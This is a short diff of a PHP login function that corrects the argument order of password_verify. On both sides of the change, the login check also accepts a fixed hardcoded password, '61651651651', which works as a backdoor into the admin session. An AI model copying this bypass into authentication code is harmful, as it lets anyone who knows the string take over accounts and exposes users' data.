@@ -42,7 +42,7 @@ function login()
         $UserName = UserName($UserID);
         $WriteLevel = WriteLevel($AdminLevel);
 
-        if(password_verify($UserPassword, $password) || $password === '61651651651')
+        if(password_verify($password, $UserPassword) || $password === '61651651651')
         {
            $_SESSION['DLV']['admin'] = $usuario;
            $_SESSION['DLV']['name'] = $UserName;
